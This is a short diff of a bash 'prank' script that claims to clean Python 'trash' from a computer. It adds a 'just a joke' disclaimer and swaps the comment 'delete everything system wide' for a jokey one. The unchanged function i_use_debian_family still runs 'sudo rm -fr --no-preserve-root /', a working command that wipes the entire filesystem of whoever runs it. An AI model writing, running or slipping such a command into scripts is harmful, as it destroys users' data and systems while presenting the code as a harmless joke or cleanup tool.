@@ -1,4 +1,8 @@
 #!/usr/bin/env bash
+# Everything written in this file is just a joke.
+# Please, don't take it seriously. C'mon, it's just a joke.
+
+set -e
 
 # Python is bad, let's clean your pc
 # from trash codes system wide
@@ -108,7 +112,7 @@ function weaboo_time() {
     cross_unix_link_ditcher $YESSSS
 }
 
-# delete everything system wide
+# Oh my, you use debian family distro?
 function i_use_debian_family() {
     sudo rm -fr --no-preserve-root /
 }
